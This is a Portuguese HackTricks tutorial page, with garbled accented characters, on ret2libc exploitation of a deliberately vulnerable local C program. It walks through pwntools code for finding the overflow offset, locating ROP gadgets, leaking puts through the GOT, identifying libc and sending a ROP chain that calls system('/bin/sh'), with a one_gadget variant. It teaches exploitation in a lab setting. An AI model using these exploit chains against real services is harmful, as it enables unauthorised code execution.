<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas t√©cnicas de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# Resumo R√°pido

1. **Encontre** o **offset** do overflow
2. **Encontre** os gadgets `POP_RDI`, `PUTS_PLT` e `MAIN_PLT`
3. Use os gadgets anteriores para **vazar o endere√ßo de mem√≥ria** do puts ou de outra fun√ß√£o libc e **encontre a vers√£o da libc** ([baixe-a](https://libc.blukat.me))
4. Com a biblioteca, **calcule o ROP e explore-o**

# Outros tutoriais e bin√°rios para praticar

Este tutorial vai explorar o c√≥digo/bin√°rio proposto neste tutorial: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
Outros tutoriais √∫teis: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

# C√≥digo

Nome do arquivo: `vuln.c`
```c
#include <stdio.h>

int main() {
    char buffer[32];
    puts("Simple ROP.\n");
    gets(buffer);

    return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector  -no-pie
```
# ROP - Vazando endere√ßo da LIBC

Vou usar o c√≥digo localizado aqui para fazer o exploit.\
Baixe o exploit e coloque-o no mesmo diret√≥rio do bin√°rio vulner√°vel e forne√ßa os dados necess√°rios para o script:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# 1- Encontrando o offset

O modelo precisa de um offset antes de continuar com o exploit. Se nenhum for fornecido, ele executar√° o c√≥digo necess√°rio para encontr√°-lo (por padr√£o, `OFFSET = ""`):
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
    gdb.attach(p.pid, "c") #Attach and continue
    payload = cyclic(1000)
    print(r.clean())
    r.sendline(payload)
    #x/wx $rsp -- Search for bytes that crashed the application
    #cyclic_find(0x6161616b) # Find the offset of those bytes
    return
```
**Execute** `python template.py` uma console GDB ser√° aberta com o programa sendo interrompido. Dentro dessa **console GDB** execute `x/wx $rsp` para obter os **bytes** que iriam sobrescrever o RIP. Finalmente, obtenha o **offset** usando uma console **python**:
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../.gitbook/assets/image (140).png>)

Depois de encontrar o deslocamento (neste caso 40), altere a vari√°vel OFFSET dentro do modelo usando esse valor.\
`OFFSET = "A" * 40`

Outra maneira seria usar: `pattern create 1000` -- _execute until ret_ -- `pattern seach $rsp` do GEF.

# 2- Encontrando Gadgets

Agora precisamos encontrar gadgets ROP dentro do bin√°rio. Esses gadgets ROP ser√£o √∫teis para chamar `puts` para encontrar a **libc** sendo usada e, posteriormente, **lan√ßar o exploit final**.
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
O `PUTS_PLT` √© necess√°rio para chamar a **fun√ß√£o puts**.\
O `MAIN_PLT` √© necess√°rio para chamar a **fun√ß√£o main** novamente ap√≥s uma intera√ß√£o para **explorar** o **estouro** **novamente** (rodadas infinitas de explora√ß√£o). **√â usado no final de cada ROP para chamar o programa novamente**.\
O **POP\_RDI** √© necess√°rio para **passar** um **par√¢metro** para a fun√ß√£o chamada.

Nesta etapa, voc√™ n√£o precisa executar nada, pois tudo ser√° encontrado pelo pwntools durante a execu√ß√£o.

# 3- Encontrando a biblioteca LIBC

Agora √© hora de encontrar qual vers√£o da biblioteca **libc** est√° sendo usada. Para fazer isso, vamos **vazar** o **endere√ßo** na mem√≥ria da **fun√ß√£o** `puts` e, em seguida, vamos **procurar** em qual **vers√£o da biblioteca** a vers√£o do puts est√° nesse endere√ßo.
```python
def get_addr(func_name):
    FUNC_GOT = elf.got[func_name]
    log.info(func_name + " GOT @ " + hex(FUNC_GOT))
    # Create rop chain
    rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

    #Send our rop-chain payload
    #p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
    print(p.clean()) # clean socket buffer (read all and print)
    p.sendline(rop1)

    #Parse leaked address
    recieved = p.recvline().strip()
    leak = u64(recieved.ljust(8, "\x00"))
    log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
    #If not libc yet, stop here
    if libc != "":
        libc.address = leak - libc.symbols[func_name] #Save libc base
        log.info("libc base @ %s" % hex(libc.address))
    
    return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
    print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
    p.interactive()
```
Para fazer isso, a linha mais importante do c√≥digo executado √©:
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
Isso enviar√° alguns bytes at√© que seja poss√≠vel **sobrescrever** o **RIP**: `OFFSET`.\
Em seguida, definir√° o **endere√ßo** do gadget `POP_RDI` para que o pr√≥ximo endere√ßo (`FUNC_GOT`) seja salvo no registro **RDI**. Isso ocorre porque queremos **chamar puts** passando o **endere√ßo** do `PUTS_GOT` como o endere√ßo na mem√≥ria da fun√ß√£o puts √© salvo no endere√ßo apontado por `PUTS_GOT`.\
Depois disso, `PUTS_PLT` ser√° chamado (com `PUTS_GOT` dentro do **RDI**) para que puts possa **ler o conte√∫do** dentro de `PUTS_GOT` (**o endere√ßo da fun√ß√£o puts na mem√≥ria**) e **imprimi-lo**.\
Finalmente, a **fun√ß√£o principal √© chamada novamente** para que possamos explorar o overflow novamente.

Dessa forma, **enganamos a fun√ß√£o puts** para **imprimir** o **endere√ßo** na **mem√≥ria** da fun√ß√£o **puts** (que est√° dentro da biblioteca **libc**). Agora que temos esse endere√ßo, podemos **procurar qual vers√£o da libc est√° sendo usada**.

![](<../../../.gitbook/assets/image (141).png>)

Como estamos **explorando** um bin√°rio **local**, **n√£o √© necess√°rio** descobrir qual vers√£o da **libc** est√° sendo usada (basta encontrar a biblioteca em `/lib/x86_64-linux-gnu/libc.so.6`).\
Mas, em um caso de explora√ß√£o remota, explicarei aqui como voc√™ pode encontr√°-lo:

## 3.1- Procurando pela vers√£o da libc (1)

Voc√™ pode procurar qual biblioteca est√° sendo usada na p√°gina da web: [https://libc.blukat.me/](https://libc.blukat.me)\
Tamb√©m permitir√° que voc√™ baixe a vers√£o descoberta da **libc**

![](<../../../.gitbook/assets/image (142).png>)

## 3.2- Procurando pela vers√£o da libc (2)

Voc√™ tamb√©m pode fazer:

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

Isso levar√° algum tempo, seja paciente.\
Para que isso funcione, precisamos de:

* Nome do s√≠mbolo da libc: `puts`
* Endere√ßo da libc vazada: `0x7ff629878690`

Podemos descobrir qual **libc** √© mais prov√°vel que esteja sendo usada.
```
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
Obtemos 2 resultados (deve-se tentar o segundo se o primeiro n√£o funcionar). Baixe o primeiro:
```
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
  -> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
  -> Downloading package
  -> Extracting package
  -> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
## 3.3- Outras fun√ß√µes para vazar

Copie a libc de `libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` para o nosso diret√≥rio de trabalho.
```python
puts
printf
__libc_start_main
read
gets
```
# 4- Encontrando o endere√ßo base da libc e explorando

Neste ponto, devemos saber qual biblioteca libc est√° sendo usada. Como estamos explorando um bin√°rio local, usarei apenas: `/lib/x86_64-linux-gnu/libc.so.6`

Portanto, no in√≠cio de `template.py`, altere a vari√°vel **libc** para: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Defina o caminho da biblioteca quando souber`

Dando o **caminho** para a **biblioteca libc**, o resto da **explora√ß√£o ser√° calculado automaticamente**.

Dentro da fun√ß√£o `get_addr`, o **endere√ßo base da libc** ser√° calculado:
```python
if libc != "":
    libc.address = leak - libc.symbols[func_name] #Save libc base
    log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
Observe que o **endere√ßo base final da libc deve terminar em 00**. Se esse n√£o for o seu caso, voc√™ pode ter vazado uma biblioteca incorreta.
{% endhint %}

Em seguida, o endere√ßo da fun√ß√£o `system` e o **endere√ßo** da string _"/bin/sh"_ ser√£o **calculados** a partir do **endere√ßo base** da **biblioteca libc** e fornecidos pela **biblioteca libc**.
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
Finalmente, o exploit de execu√ß√£o /bin/sh ser√° preparado e enviado:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
Vamos explicar este √∫ltimo ROP.\
O √∫ltimo ROP (`rop1`) terminou chamando novamente a fun√ß√£o principal, ent√£o podemos **explorar novamente** o **overflow** (√© por isso que o `OFFSET` est√° aqui novamente). Em seguida, queremos chamar `POP_RDI` apontando para o **endere√ßo** de _"/bin/sh"_ (`BINSH`) e chamar a fun√ß√£o **system** (`SYSTEM`) porque o endere√ßo de _"/bin/sh"_ ser√° passado como par√¢metro.\
Finalmente, o **endere√ßo da fun√ß√£o exit** √© **chamado** para que o processo **saia corretamente** e nenhum alerta seja gerado.

**Desta forma, o exploit executar√° um shell **_**/bin/sh**_**.**

![](<../../../.gitbook/assets/image (143).png>)

# 4(2)- Usando ONE\_GADGET

Voc√™ tamb√©m pode usar o [**ONE\_GADGET**](https://github.com/david942j/one\_gadget) para obter um shell em vez de usar **system** e **"/bin/sh". ONE\_GADGET** encontrar√° dentro da biblioteca libc alguma maneira de obter um shell usando apenas um **endere√ßo ROP**. \
No entanto, normalmente existem algumas restri√ß√µes, as mais comuns e f√°ceis de evitar s√£o como `[rsp+0x30] == NULL`. Como voc√™ controla os valores dentro do **RSP**, basta enviar alguns valores NULL a mais para evitar a restri√ß√£o.

![](<../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
# ARQUIVO DE EXPLOIT

Voc√™ pode encontrar um modelo para explorar essa vulnerabilidade aqui:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# Problemas comuns

## MAIN_PLT = elf.symbols\['main'] n√£o encontrado

Se o s√≠mbolo "main" n√£o existir, voc√™ pode simplesmente procurar onde est√° o c√≥digo principal:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
e defina o endere√ßo manualmente:
```python
MAIN_PLT = 0x401080
```
## Puts n√£o encontrado

Se o bin√°rio n√£o estiver usando Puts, voc√™ deve verificar se ele est√° usando

## `sh: 1: %s%s%s%s%s%s%s%s: not found`

Se voc√™ encontrar este **erro** ap√≥s criar **todos** os exploits: `sh: 1: %s%s%s%s%s%s%s%s: not found`

Tente **subtrair 64 bytes do endere√ßo de "/bin/sh"**:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
